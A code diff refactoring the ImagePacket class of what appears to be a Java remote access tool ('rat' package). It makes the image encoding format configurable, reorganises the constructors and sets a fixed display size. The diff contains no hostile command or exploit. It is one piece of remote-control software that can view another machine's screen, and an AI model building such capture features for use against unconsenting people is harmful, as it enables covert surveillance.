@@ -14,15 +14,23 @@ import de.sogomn.rat.ActiveClient;
 public final class ImagePacket implements IPacket {
 	
 	private BufferedImage image;
+	private String format;
 	
 	private static final BufferedImage NO_IMAGE = new BufferedImage(100, 100, BufferedImage.TYPE_INT_RGB);
+	private static final int SCREEN_WIDTH = 500;
+	private static final int SCREEN_HEIGHT = 500;
 	
-	public ImagePacket() {
-		image = NO_IMAGE;
+	public ImagePacket(final BufferedImage image, final String format) {
+		this.image = image;
+		this.format = format;
 	}
 	
 	public ImagePacket(final BufferedImage image) {
-		this.image = image;
+		this(image, "");
+	}
+	
+	public ImagePacket() {
+		this(NO_IMAGE);
 	}
 	
 	@Override
@@ -30,7 +38,7 @@ public final class ImagePacket implements IPacket {
 		final ByteArrayOutputStream out = new ByteArrayOutputStream();
 		
 		try {
-			ImageIO.write(image, "JPG", out);
+			ImageIO.write(image, format, out);
 		} catch (final IOException ex) {
 			ex.printStackTrace();
 		}
@@ -70,6 +78,7 @@ public final class ImagePacket implements IPacket {
 			g.drawImage(image, 0, 0, width, height, null);
 		});
 		screen.setResizeBehavior(ResizeBehavior.KEEP_ASPECT_RATIO);
+		screen.setSize(SCREEN_WIDTH, SCREEN_HEIGHT);
 		screen.show();
 		screen.redraw();
 	}
